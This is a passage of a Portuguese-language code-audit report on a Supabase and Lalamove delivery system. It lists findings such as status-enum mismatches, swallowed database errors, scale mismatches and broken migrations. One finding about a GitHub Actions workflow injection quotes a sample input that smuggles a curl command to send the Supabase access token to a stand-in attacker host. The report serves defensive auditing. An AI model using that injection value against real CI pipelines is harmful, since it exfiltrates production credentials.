- **Causa raiz:** `${{ ... }}` e substituido no YAML ANTES do shell existir: o valor do input vira texto do script. Um valor com aspas duplas (`a.sql"; curl -d "$SUPABASE_ACCESS_TOKEN" https://attacker.tld; echo "`) fecha a string e executa comando arbitrario no runner, com o Personal Access Token da Management API do projeto oficial exportado no ambiente do job — token que aplica DDL e le qualquer tabela de producao.
- **Arquivos:** `.github/workflows/apply-migrations.yml`
- **Etapas do plano:** 279

#### B-003 — Arquivos de documentacao e bundle n8n na raiz expoem dado real de negocio e identificacao da conta

- **Camada:** Transversal — segurança
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 3 revisor(es) independente(s)
- **Impacto no negócio:** Quem abrir o repositorio ve o nome da empresa e da pessoa responsavel pela conta, o identificador da conta na Lalamove, o faturamento consolidado de 18 meses (R$ 536 mil), o ticket medio e o endereco do portal interno. Nao e credencial, mas e informacao comercial que a empresa provavelmente nao quer junto do codigo - e serve de mapa para quem for atacar.
- **Evidência:**
  ```
  Um ponto a corrigir: nao ha token de webhook Bitrix24 nessas URLs. Testei 'bitrix24.com.br/rest/1/[A-Za-z0-9_]{4,}' nos 6 JSONs: 0 ocorrencias — o que segue '/rest/1/' e placeholder/variavel, nao credencial. E o projeto Supabase 'iecgydonctmabiijadsf' tambem nao e segredo: ja esta em supabase/config.toml:1 e e exposto via VITE_SUPABASE_URL. O que vaza de fato e dado de negocio (faturamento, volume) e identificacao de conta/pessoa, nao chave.
  ```
- **Causa raiz:** Entregaveis de uma sessao de analise (relatorio, documentacao, export de fluxos n8n) foram commitados na raiz em vez de ficarem fora do repo ou em docs/ com os dados tirados. Nenhum deles e lido por codigo: grep de 'lalamove_bundle_import|lalamove_f0|order_history' em src/, supabase/ e scripts/ nao retorna nenhuma referencia.
- **Arquivos:** `lalamove_order_history_full.md`, `lalamove_bundle_import.json`, `lalamove_f00_bootstrap.json`, `lalamove_f01_cotacao.json`, `lalamove_f02_pedido.json`, `lalamove_f03_rastreamento.json`, `lalamove_f04_pod.json`, `lalamove_cron_setup.sh`, `lalamove_token_manager.py`, `lalamove_documentacao_completa.md`, `lalamove_suplemento_v2.md`
- **Etapas do plano:** 057


## Causa raiz: O valor que o sistema grava não é o que o banco aceita: nunca houve uma tradução única de status

O ciclo de vida do pedido é escrito em vocabulários diferentes em cada ponto: a grafia da Lalamove, a grafia interna, o catálogo novo de veículos, o nome do canal de mensagem. Como cada lugar criou a sua própria tradução (ou nenhuma), o banco recusa a gravação em silêncio ou aceita um valor que ninguém mais entende. O efeito prático é dinheiro e operação: pedido pago na Lalamove que não entra no banco, cancelamento que a tela confirma mas o pedido continua aparecendo como ativo, pedido já encerrado voltando para a etapa inicial no CRM, avaliação de risco de motorista com falha que nunca é salva e aviso de quota que dispara na hora errada por estar em outra escala.

**12 achado(s) sob esta causa.**


#### C-014 — Pedido criado e cobrado na Lalamove nao e gravado no banco: vehicle_type do formulario nao existe no enum do banco

- **Camada:** Interface — fluxo de pedido
- **Severidade:** Crítica · **Confiança:** hipotese · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** O operador cria uma entrega, paga por ela na Lalamove e ve 'Pedido criado com sucesso', mas o pedido nao aparece na lista nem no painel: fica invisivel para acompanhamento, cobranca e alertas. Atinge o tipo de veiculo que vem marcado por padrao na tela (LALAGO) e todos os servicos novos, exceto CAR e VAN.
- **Evidência:**
  ```
  src/components/orders/NewOrderDialog.tsx:149 `vehicleType: 'LALAGO',` | :423 `serviceType: form.vehicleType,` | supabase/functions/lalamove-api/index.ts:741 `const { data: insertedOrder } = await supabase.from('lalamove_orders').insert({` e :752 `vehicle_type: body.serviceType || 'MOTORCYCLE',` | supabase/migrations/20251224143803_3b1f0374-1b95-4fba-a31b-f44a9fd14494.sql:18-23 `CREATE TYPE public.vehicle_type AS ENUM ( 'MOTORCYCLE', 'CAR', 'VAN', 'TRUCK' );` e :85 `vehicle_type public.vehicle_type NOT NULL DEFAULT 'MOTORCYCLE',` | supabase/migrations/20261122120100_lalamove_integration_columns.sql:112 `COMMENT ON COLUMN public.lalamove_orders.service_type IS 'serviceType BR da v3 (14 valores). vehicle_type (enum de 4) passa a ser derivado deste.';` (derivacao inexistente)
  ```
- **Causa raiz:** O catalogo v3 (src/types/lalamove.ts:18-33: LALAGO, LALAPRO, HATCHBACK, UV_FIORINO, TRUCK330...) foi adotado na UI e na API, mas o enum `vehicle_type` do banco nunca foi migrado e continua com os 4 valores antigos. A edge grava o serviceType cru nessa coluna, e o erro do insert e descartado: `const { data: insertedOrder } = await supabase.from('lalamove_orders').insert({...})` (index.ts:741) nao captura `error`. Sem linha inserida, `insertedOrder?.id` e undefined e todo o restante (coordenadas, place_id, campos Guardian) tambem e pulado.
- **Arquivos:** `src/components/orders/NewOrderDialog.tsx`, `supabase/functions/lalamove-api/index.ts`, `supabase/migrations/20251224143803_3b1f0374-1b95-4fba-a31b-f44a9fd14494.sql`, `src/integrations/supabase/types.ts`
- **Etapas do plano:** 015
- **HIPÓTESE — NÃO VERIFICADO.** Falta para confirmar: acesso de leitura ao banco/edges de produção (ver 01-INVENTARIO.md §11)

#### C-015 — Cancelamento manual grava 'CANCELED' numa coluna que só aceita 'CANCELLED' — o pedido nunca é marcado como cancelado no banco

- **Camada:** Regras de negócio — ciclo de vida (+ 3 outro(s) local)
- **Severidade:** Crítica · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Quando um operador cancela um pedido, o cancelamento acontece na Lalamove mas o sistema continua mostrando a entrega como ativa, sem motivo, sem quem cancelou e sem data — e os painéis, relatórios e alertas seguem tratando o pedido como em andamento.
- **Evidência:**
  ```
  supabase/functions/lalamove-api/index.ts:926-936 (`status: 'CANCELED'`, sem `const { error }`) vs supabase/migrations/20251224143803_3b1f0374-1b95-4fba-a31b-f44a9fd14494.sql:6,104 e 20261122120000_baseline_order_status_values.sql:16-18 (enum sem 'CANCELED'); mitigação parcial em supabase/functions/lalamove-webhook/index.ts:113
  ```
  Mesma causa, outro local — Backend — edges Lalamove:
  ```
  supabase/functions/lalamove-api/index.ts:926-936; supabase/migrations/20251224143803_*.sql:6-14 e :104; supabase/migrations/20261122120000_baseline_order_status_values.sql:16-18; supabase/migrations/20261122120100_lalamove_integration_columns.sql:53-63 (widening é só em lalamove_status_history); supabase/migrations/20261123200000_optout_and_tracking_end.sql:123 (compara 'CANCELED' mas não cria o valor).
  ```
  Mesma causa, outro local — Interface — fluxo de pedido:
  ```
  supabase/functions/lalamove-api/index.ts:926-936 `await supabase.from('lalamove_orders').update({ status: 'CANCELED', cancellation_reason: cancellationReason, cancellation_notes: cancellationNotes, cancelled_by: cancelledBy, ... })` | supabase/migrations/20251224143803_3b1f0374-1b95-4fba-a31b-f44a9fd14494.sql:104 `status public.order_status NOT NULL DEFAULT 'PENDING',` | src/integrations/supabase/types.ts:4794-4806 `order_status: [ "PENDING", ... "CANCELLED", ... ]` | mitigacao parcial do status: supabase/functions/lalamove-webhook/index.ts:113 `'CANCELED': 'CANCELLED',` | UI: src/components/orders/OrderDetailModal.tsx:395 `onClick={() => cancelMutation.mutate({ orderId: order.lalamoveId, reason: cancelReason, notes: cancelNotes })}`
  ```
  Mesma causa, outro local — Banco — integridade e índices:
  ```
  supabase/functions/lalamove-api/index.ts:926-936 — `await supabase\n  .from('lalamove_orders')\n  .update({ status: 'CANCELED', cancellation_reason: ..., cancelled_by: cancelledBy, ... })\n  .eq('lalamove_id', cancelOrderId);` ; supabase/migrations/20251224143803_3b1f0374-1b95-4fba-a31b-f44a9fd14494.sql:104 `status public.order_status NOT NULL DEFAULT 'PENDING',`
  ```
- **Causa raiz:** A coluna lalamove_orders.status é o enum order_status, que grafa CANCELLED com dois L. O handler `case 'cancel'` escreve 'CANCELED' (grafia da API Lalamove, um L). O Postgres rejeita o UPDATE inteiro com 22P02 (invalid input value for enum). O retorno não é desestruturado — não há `const { error }` — então o erro é descartado e a edge devolve sucesso.
- **Arquivos:** `src/components/orders/OrderDetailModal.tsx`, `src/integrations/supabase/types.ts`, `supabase/functions/lalamove-api/index.ts`, `supabase/migrations/20251224143803_3b1f0374-1b95-4fba-a31b-f44a9fd14494.sql`, `supabase/migrations/20261122120000_baseline_order_status_values.sql`
- **Etapas do plano:** 059

#### A-016 — A restrição de pod_status proíbe o próprio valor padrão da coluna, o que pode estar derrubando em silêncio toda a gravação de paradas do pedido

- **Camada:** Regras de negócio — ciclo de vida
- **Severidade:** Alta · **Confiança:** hipotese · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Se a restrição estiver mesmo em pé, nenhuma parada de pedido é salva — e é dessas linhas que saem o telefone e o nome do destinatário usados no aviso de chegada por WhatsApp e a prova de entrega (foto). O resultado é entrega sem comprovante registrado e aviso ao cliente sem destinatário.
- **Evidência:**
  ```
  supabase/migrations/20251224181640_86877442-4075-4c58-8fcf-7a698b3af567.sql:19 (DEFAULT 'NOT_REQUIRED') vs supabase/migrations/20260712112618_ddd2aa1c-8a4f-445c-956c-b9fe1a298c3e.sql:5 (CHECK que exclui esse valor); único INSERT em supabase/functions/lalamove-api/coordinates.ts:103-128, erro apenas logado em :128
  ```
- **Causa raiz:** A restrição foi adicionada sem remover nem ajustar o DEFAULT 'NOT_REQUIRED' da mesma coluna, e nenhuma migration posterior a corrige (não há ALTER COLUMN pod_status nem DROP dessa constraint em todo supabase/). Como o único gravador de lalamove_stops não envia pod_status, todo INSERT novo cai no default proibido e o upsert é rejeitado — com o erro apenas registrado em log, nunca propagado. Sinal de que a inconsistência é conhecida: uma migration 11 dias posterior cria lalamove_stop_proofs aceitando 'NOT_REQUIRED' no CHECK (20260723122332:10) e faz a carga inicial tratando esse valor como existente em lalamove_stops (linha 73).
- **Arquivos:** `supabase/migrations/20251224181640_86877442-4075-4c58-8fcf-7a698b3af567.sql`, `supabase/migrations/20260712112618_ddd2aa1c-8a4f-445c-956c-b9fe1a298c3e.sql`, `supabase/migrations/20260723122332_c21c9304-eed8-478e-a96e-274111e49528.sql`, `supabase/functions/lalamove-api/coordinates.ts`, `supabase/functions/lalamove-webhook/index.ts`
- **Etapas do plano:** 031
- **HIPÓTESE — NÃO VERIFICADO.** Falta para confirmar: Sem acesso ao banco oficial não dá para saber se a constraint chegou a ser aplicada (ela falharia se já houvesse linhas com 'NOT_REQUIRED') nem se existem linhas em lalamove_stops. Resolver com: `select conname, pg_get_constraintdef(oid) from pg_constraint where conrelid='public.lalamove_stops'::regclass`, `select column_default from information_schema.columns where table_name='lalamove_stops' and column_name='pod_status'` e `select count(*) from lalamove_stops`.

#### A-036 — A sincronização periódica grava o status cru da Lalamove no enum: pedido cancelado trava como ativo e é re-sincronizado para sempre

- **Camada:** Regras de negócio — ciclo de vida
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Pedidos cancelados ficam eternamente na lista de entregas em andamento e consomem chamada paga à API da Lalamove em toda sincronização, sem nunca sair da fila. O contador de pedidos ativos do painel fica inflado.
- **Evidência:**
  ```
  supabase/functions/lalamove-api/index.ts:465-467 (`const order: Record<string, unknown> = { lalamove_id: orderData.orderId as string, status: orderData.status as string,`), index.ts:511-513 (`if (error) { logger.error('Error updating order:', error); return null; }`), index.ts:620-623 (lista de status ativos) e index.ts:641-642 (`await syncOrderToDatabase(...); synced++;`)
  ```
- **Causa raiz:** `syncOrderToDatabase` escreve `orderData.status` sem passar por mapa nenhum — diferente de `upsertOrderToDatabase`, que fica 70 linhas abaixo no mesmo arquivo e tem statusMap (linhas 546-556). A Lalamove devolve 'CANCELED' (um L) para pedido cancelado, valor ausente do enum order_status: o UPDATE falha (22P02), cai no `if (error) { logger.error(...); return null; }` da linha 511 e o pedido permanece com o status antigo. Como o status antigo está na lista de 'ativos' da linha 623, o laço de syncActiveOrders volta a buscar esse mesmo pedido na Lalamove em toda execução, indefinidamente.
- **Arquivos:** `supabase/functions/lalamove-api/index.ts`
- **Etapas do plano:** 074

#### A-037 — Cinco vocabulários de status diferentes para o mesmo ciclo de vida, misturados na mesma coluna de histórico

- **Camada:** Regras de negócio — ciclo de vida
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** O mesmo acontecimento aparece com dois nomes diferentes no histórico do pedido dependendo de qual caminho o registrou, e a linha do tempo mostra etapas repetidas ou fora de ordem. Qualquer relatório que conte pedidos por status subconta, porque precisa conhecer as duas grafias.
- **Evidência:**
  ```
  supabase/functions/lalamove-api/index.ts:467 e :505-521 (status cru no pedido e no histórico) vs supabase/functions/lalamove-webhook/index.ts:322-329 (interno); mapas em lalamove-api:544-556, lalamove-webhook:108-117, lalamove-uapi:429-435; front em src/lib/lalamoveTimeline.ts:35-52 e src/lib/lalamoveOrderEdit.ts:26-41; coluna livre em supabase/migrations/20261122120100_lalamove_integration_columns.sql:53-64. Enum sem 'CANCELED': supabase/migrations/20251224143803_3b1f0374-1b95-4fba-a31b-f44a9fd14494.sql:6-14 + 20261122120000_baseline_order_status_values.sql:16-18.
  ```
- **Causa raiz:** Nunca houve uma tradução única entre o vocabulário da API v3 (ASSIGNING_DRIVER, DELIVERING, CANCELED) e o interno (PENDING, MATCHED, CANCELLED). Cada ponto de escrita criou o seu mapa, com chaves e defaults diferentes, e um deles não traduz nada. lalamove_status_history.status, além disso, deixou de ser enum e virou text livre (supabase/migrations/20261122120100_lalamove_integration_columns.sql:55-64), então nada impede a mistura.
- **Arquivos:** `supabase/functions/lalamove-webhook/index.ts`, `supabase/functions/lalamove-api/index.ts`, `supabase/functions/lalamove-uapi/index.ts`, `src/lib/lalamoveTimeline.ts`, `src/lib/lalamoveOrderEdit.ts`, `supabase/migrations/20261122120100_lalamove_integration_columns.sql`
- **Etapas do plano:** 075, 076

#### A-048 — Avaliação de risco não é gravada para nenhum motorista com falha: CHECK de failure_rate espera fração, a edge grava percentual

- **Camada:** Regras de negócio — cálculos
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** O histórico de avaliação de motoristas de risco — justamente os que importam — não existe no banco. A tela de Avaliações mostra só motoristas sem nenhuma falha, e não há como auditar depois por que um motorista foi bloqueado.
- **Evidência:**
  ```
  supabase/migrations/20260712113111_afc9cefc-6f90-498e-8922-63e5a1ee8345.sql:3 — "ADD CONSTRAINT driver_evaluations_failure_rate_range CHECK (failure_rate IS NULL OR (failure_rate >= 0 AND failure_rate <= 1)),"; supabase/functions/evaluate-driver/index.ts:411 — "failureRate: driver.failure_rate || (total > 0 ? (failed / total) * 100 : 0),"; index.ts:822-834 — "await supabase.from('driver_evaluations').insert([{ ... failure_rate: stats.failureRate," (retorno não conferido); index.ts:839 — "logger.log('[evaluate-driver] Evaluation saved to database');".
  ```
- **Causa raiz:** Duas unidades para a mesma grandeza: a edge calcula taxa de falha em porcentagem (0–100) e a constraint do banco foi escrita para fração (0–1). Qualquer motorista com failure_rate > 1% faz o INSERT em driver_evaluations violar o CHECK; o erro é engolido pelo catch e a avaliação some.
- **Arquivos:** `supabase/migrations/20260712113111_afc9cefc-6f90-498e-8922-63e5a1ee8345.sql`, `supabase/functions/evaluate-driver/index.ts`, `src/pages/EvaluationsPage.tsx`
- **Etapas do plano:** 087

#### A-056 — usage_ratio é gravado em duas escalas diferentes pelas edges; o painel de Quota mostra 0,9% no lugar de 90% e o alerta crítico dispara errado

- **Camada:** Interface — painéis e relatórios
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** No painel de Quota, as chamadas feitas por um dos caminhos aparecem como 0,9% de uso quando o consumo real é 90% — o dono não vê que está perto do limite da Lalamove. E a trigger dispara alerta de quota crítica para qualquer chamada com mais de 0,95% de uso registrada pelo outro caminho, enchendo os alertas de falso positivo.
- **Evidência:**
  ```
  supabase/functions/lalamove-api/index.ts:64-66 e :69-79; supabase/functions/lalamove-gateway/index.ts:86-89 e :109-116; supabase/migrations/20260723131806_a3854e60-0935-4d4c-be8a-51b57157d413.sql:11; supabase/migrations/20260723132258_bb348d49-2f3a-458f-885a-327cabee5179.sql:22 e :40-42; src/pages/LalamoveQuotaPage.tsx:158-159 e :284
  ```
- **Causa raiz:** Duas edges escrevem na mesma coluna `lalamove_rate_limits.usage_ratio` com escalas distintas (0–100 e 0–1). A página e o eixo Y (domain [0,100], unit '%') assumem 0–100; a trigger de alerta assume 0–1.
- **Arquivos:** `supabase/functions/lalamove-api/index.ts`, `supabase/functions/lalamove-gateway/index.ts`, `src/pages/LalamoveQuotaPage.tsx`, `src/hooks/useLalamoveQuota.ts`, `supabase/migrations/20260723132258_bb348d49-2f3a-458f-885a-327cabee5179.sql`
- **Etapas do plano:** 095

#### M-029 — Jobs de fila dos tipos email/whatsapp/slack nunca entregam e são marcados como concluídos

- **Camada:** Backend — notificação e fila
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Notificação colocada na fila como "email", "whatsapp" ou "slack" não chega a ninguém e a fila mostra o job como concluído com sucesso. É perda silenciosa de aviso: ninguém descobre pelo painel.
- **Evidência:**
  ```
  supabase/functions/job-worker/index.ts:150-152 `alert_id: payload.alert_id ?? payload.alertId ?? crypto.randomUUID(), type: payload.type ?? channel,` · supabase/functions/_shared/schemas.ts:54 `type: z.string().min(1, "type é obrigatório"),` (não barra o valor) · supabase/migrations/20251224143803_3b1f0374-1b95-4fba-a31b-f44a9fd14494.sql:53-59 `CREATE TYPE public.alert_type AS ENUM ( 'DRIVER_BLOCKED', 'ROUTE_DEVIATION', 'DRIVER_STOPPED', 'LATE_DELIVERY', 'APPROVAL_REQUIRED', 'ORDER_CANCELLED' );` · supabase/functions/job-worker/index.ts:1098-1101 `await supabase.rpc('mark_job_completed', { p_job_id: jobPayload.jobId, p_result: result });` · rastro que o auditor não viu: send-notification/index.ts:741-749 `recordNotificationLog( supabase, alert_id, "none", "", false, `Sem canal de notificação ativo em alert_configurations para ${type}`, )`
  ```
- **Causa raiz:** `type` cai no nome do canal quando o payload não traz `type`. Esse valor é usado como `alert_type` (enum do Postgres) em duas chamadas: `claim_alert_notification(p_alert_type alert_type, …)` (migration 20260712221144:58-62) e `.from("alert_configurations").eq("alert_type", type)`. As duas falham com erro de cast de enum, e os dois pontos tratam a falha como não-fatal: a primeira segue sem dedup, a segunda devolve lista vazia de configuração — o que leva ao retorno de sucesso sem envio. O `job-worker` então chama `mark_job_completed`.
- **Arquivos:** `supabase/functions/job-worker/index.ts`, `supabase/functions/send-notification/index.ts`, `supabase/migrations/20251224143803_3b1f0374-1b95-4fba-a31b-f44a9fd14494.sql`
- **Etapas do plano:** 108

#### M-047 — A coluna lalamove_status, que os gatilhos de geo leem como status primário do pedido, nunca é escrita por ninguém — e as listas de liberação não cobrem o vocabulário real

- **Camada:** Regras de negócio — ciclo de vida
- **Severidade:** Média · **Confiança:** hipotese · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Os avisos automáticos de 'motorista se aproximando' e 'motorista chegou' deixam de sair em parte dos pedidos: nenhum aviso de entrega quando o pedido está marcado como 'Em entrega', e nenhum aviso de coleta quando ele está como 'Pendente'. O cliente e o fornecedor ficam sem o aviso que o sistema promete.
- **Evidência:**
  ```
  Função viva: supabase/migrations/20261122131000_geo_eta_delay.sql:40 (CREATE OR REPLACE), :81 `v_status := COALESCE(o.lalamove_status, o.status_enum);`, :172 lista de coleta sem 'PENDING', :223 lista de entrega já com 'PICKED_UP','DELIVERING'. Coluna criada em supabase/migrations/20261122120100_lalamove_integration_columns.sql:12. Nenhuma escrita fora de supabase/tests/02_scenarios.sql:43,87,116. Webhook grava só `status` em supabase/functions/lalamove-webhook/index.ts:322-326 e o cru apenas em metadata na linha 531.
  ```
- **Causa raiz:** A coluna foi criada para guardar o status cru da Lalamove e os gatilhos geo_evaluate_tracking e o de atraso de ETA (20261122131000_geo_eta_delay.sql:81) a leem com prioridade sobre o enum. Como nenhum código a preenche, v_status cai sempre no enum interno. As listas de liberação, porém, foram escritas misturando os dois vocabulários ('MATCHED' só existe no interno, 'ASSIGNING_DRIVER' vinha do cru) e deixaram de fora justamente 'PENDING' — que é o que o webhook grava para ASSIGNING_DRIVER (index.ts:109) — e 'DELIVERING'.
- **Arquivos:** `supabase/migrations/20261122130100_geo_foundation.sql`, `supabase/migrations/20261122131000_geo_eta_delay.sql`, `supabase/migrations/20261122120100_lalamove_integration_columns.sql`, `supabase/functions/lalamove-webhook/index.ts`
- **Etapas do plano:** 126
- **HIPÓTESE — NÃO VERIFICADO.** Falta para confirmar: Sem MCP do projeto iecgydonctmabiijadsf não dá para conferir se a coluna está 100% NULL em produção nem contar os eventos geo que deixaram de sair. Confirmar com: `select count(*) filter (where lalamove_status is not null), count(*) from lalamove_orders` e `select status, count(*) from lalamove_orders where status in ('PENDING','DELIVERING')`.

#### M-050 — Pedido em 'ASSIGNING_DRIVER', 'DELIVERING' ou 'QUOTED' joga o negócio de volta para a etapa 'Novo' no Bitrix24

- **Camada:** Regras de negócio — ciclo de vida
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Quando um pedido avança para 'Em entrega', o negócio correspondente no CRM volta para a coluna 'Novo' — ou seja, a integração anda para trás justamente no momento mais avançado da entrega, e o time comercial vê o pedido como se nem tivesse começado.
- **Evidência:**
  ```
  bitrix24-process-queue/index.ts:169 `STAGE_ID: stageMap.get(order.status) || "NEW"`; seed de 8 status em supabase/migrations/20251224182758_5a658aa1-838d-4163-b50d-46f996e6fe2a.sql:64-73; enum ganhou QUOTED/ASSIGNING_DRIVER/DELIVERING em 20261122120000_baseline_order_status_values.sql:16-18, mas QUOTED não é escrito por nenhuma edge e ASSIGNING_DRIVER cai na mesma etapa de PENDING — o risco concreto é só DELIVERING.
  ```
- **Causa raiz:** O enum order_status ganhou três valores novos (QUOTED, ASSIGNING_DRIVER, DELIVERING — supabase/migrations/20261122120000_baseline_order_status_values.sql:16-18, já presentes em src/integrations/supabase/types.ts:4617-4619) e são efetivamente gravados (lalamove-api/index.ts:467 e :744 gravam o status cru da Lalamove; lalamove-webhook/index.ts:902 grava 'ASSIGNING_DRIVER'). A tabela bitrix24_stage_mappings nunca recebeu linhas para eles, e o código usa `|| "NEW"` em vez de 'não mexer na etapa'.
- **Arquivos:** `supabase/functions/bitrix24-process-queue/index.ts`, `supabase/migrations/20251224182758_5a658aa1-838d-4163-b50d-46f996e6fe2a.sql`, `supabase/migrations/20261122120000_baseline_order_status_values.sql`
- **Etapas do plano:** 129
- **Divergência entre revisores:** um revisor refutou e outro confirmou: CONFIRMA: O fallback é real: supabase/functions/bitrix24-process-queue/index.ts:169 usa `STAGE_ID: stageMap.get(order.status) || "NEW"`, e as linhas semeadas em 20251224182758...sql:64-73 cobrem só os 8 status antigos — as outras três migrations que tocam bitrix24_stage_mappings (20260108144121, 2026010920390 || REFUTA: Reabri os três arquivos e o caso não se sustenta, por dois motivos independentes. (1) Vocabulário inexistente: grep por DELIVERING e QUOTED em src/ e supabase/functions/ só retorna rótulos de tela, tipos e testes (src/pages/orders/OrderCard.tsx:21,23, src/lib/lalamoveTimeline.ts:45, src/integrations

#### M-051 — Quatro eventos que não mudam status gravam uma transição falsa para 'ON_GOING' no histórico do pedido

- **Camada:** Regras de negócio — ciclo de vida
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Uma simples mudança de preço ou de código de entrega aparece no histórico do pedido como se ele tivesse voltado para 'Motorista a caminho', e a tela marca 'fora de ordem' num pedido saudável. Quem audita um atraso ou uma reclamação lê um histórico que não aconteceu.
- **Evidência:**
  ```
  supabase/functions/lalamove-webhook/index.ts:779-784, 852-857, 881-886, 937-942; coluna text livre em supabase/migrations/20261122120100_*.sql:55-64; leitor em src/lib/lalamoveTimeline.ts:112-137.
  ```
- **Causa raiz:** A coluna status de lalamove_status_history é obrigatória e os autores desses casos escolheram 'ON_GOING' como valor de preenchimento, em vez de registrar o evento sem alegar mudança de estado. Como a coluna virou text livre (migration 20261122120100:55-64), nada barra o valor errado. A leitura (src/lib/lalamoveTimeline.ts:112-137) trata cada linha do histórico como transição e marca `outOfOrder` quando o posto regride.
- **Arquivos:** `supabase/functions/lalamove-webhook/index.ts`, `src/lib/lalamoveTimeline.ts`
- **Etapas do plano:** 130

#### B-034 — active_tracking.tracking_status sem CHECK e já gravado em caixas diferentes ('ACTIVE' e 'ended')

- **Camada:** Banco — integridade e índices
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 3 revisor(es) independente(s)
- **Impacto no negócio:** O rastreamento ao vivo é escolhido por esse campo. Uma divergência de maiúscula/minúscula faz pedidos em andamento sumirem da fila de atualização de rota — sem erro, sem alerta: o mapa simplesmente para de atualizar para aqueles pedidos.
- **Evidência:**
  ```
  supabase/migrations/20251224181640_86877442-4075-4c58-8fcf-7a698b3af567.sql:33 `ADD COLUMN IF NOT EXISTS tracking_status TEXT DEFAULT 'ACTIVE',` (sem CHECK; nenhuma migration posterior adiciona um). Escritor em minúscula: supabase/migrations/20261123200000_optout_and_tracking_end.sql:90-94 `SET tracking_status = 'ended', ... AND COALESCE(tracking_status, 'ACTIVE') <> 'ended';`. Leitores em maiúscula: supabase/functions/job-worker/index.ts:538 e :881 `.eq('tracking_status', 'ACTIVE');`; supabase/migrations/20261122131000_geo_eta_delay.sql:61 e supabase/migrations/20261122130100_geo_foundation.sql:408 `IF NEW.tracking_status IS DISTINCT FROM 'ACTIVE' THEN RETURN NEW; END IF;`; supabase/migrations/20260306010037_87ad0845-cb3e-48ca-a18d-a40f44d2422e.sql:134 `AND at.tracking_status = 'ACTIVE'`. Valor canônico esperado pelos testes: supabase/tests/02_scenarios.sql:240 `..., 40, 'ENDED');`.
  ```
- **Causa raiz:** Coluna de estado declarada como texto livre, sem CHECK e sem enum. Hoje o sistema ainda funciona por sorte — nada filtra por 'ENDED' —, mas o vocabulário já está inconsistente dentro do próprio banco, então o próximo filtro escrito na caixa 'errada' vai devolver zero linha sem erro nenhum. O índice parcial `idx_tracking_status_active ON public.active_tracking(tracking_status) WHERE tracking_status = 'ACTIVE'` (:104) também depende do literal exato: uma gravação como 'active' sai do índice e deixa de ser vista pelo agendador.
- **Arquivos:** `supabase/migrations/20251224181640_86877442-4075-4c58-8fcf-7a698b3af567.sql`, `supabase/migrations/20261123200000_optout_and_tracking_end.sql`, `supabase/functions/job-worker/index.ts`, `supabase/migrations/20261121194500_geo_jobs_scheduler.sql`
- **Etapas do plano:** 234


## Causa raiz: O histórico de mudanças do banco não reconstrói o banco, e reescritas copiadas perderam pedaços

A pasta que guarda a história das mudanças do banco deixou de ser confiável: alguns arquivos não rodam do zero, outros usam o truque "crie só se não existir" e por isso nunca tiveram efeito em produção, e há tabela que o sistema usa sem nenhum registro de criação. Em paralelo, quando uma função ou tabela foi reescrita, o autor copiou a versão anterior e deixou linhas de fora. O preço aparece na operação: o aviso de entrega concluída nunca é enfileirado e o nome do motorista desaparece das mensagens, o primeiro ponto de rastreio pode derrubar o início do acompanhamento, a tabela de eventos de rastreio ficou sem suas amarras de integridade e a auditoria de duplo fator nunca grava nada.

**9 achado(s) sob esta causa.**


#### A-003 — geo_evaluate_tracking perdeu as atribuições de v_notify_del e v_driver_name — notificação de entrega nunca é enfileirada e o nome do motorista some das mensagens

- **Camada:** Banco — funções, triggers e cron
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** O cliente da entrega não recebe nenhum aviso de "motorista se aproximando" nem "motorista chegou" — os eventos são gravados no banco como 'skipped' e nada é enviado. Nos avisos de coleta que ainda saem, o nome do motorista aparece em branco ("(ABC1D23) chega em ~8 min...").
- **Evidência:**
  ```
  20261122131000_geo_eta_delay.sql:54,56 (declaração) e :177,185,196,198,204,205 (únicos usos — nenhuma atribuição em todo o arquivo); atribuições existentes só na versão anterior, 20261122130100_geo_foundation.sql:433-434; efeito em geo_emit_event, 20261122130100_geo_foundation.sql:359-383.
  ```
- **Causa raiz:** A reescrita de `geo_evaluate_tracking()` na migration de ETA_DELAY (20261122131000) copiou o corpo da versão de geo_foundation sem as duas linhas de atribuição do bloco de preparação. Como `CREATE OR REPLACE` substitui a função inteira e esta é a última definição do ledger, o estado vigente é o quebrado. plpgsql não acusa variável não atribuída: ela vale NULL.
- **Arquivos:** `supabase/migrations/20261122131000_geo_eta_delay.sql`, `supabase/migrations/20261122130100_geo_foundation.sql`
- **Etapas do plano:** 018

#### M-003 — geo_blocks: tabela usada pelo front não é criada por nenhuma migration, não tem ENABLE RLS nem policy de SELECT no repo, e quebra o banco descartável

- **Camada:** Banco — RLS e autorização
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
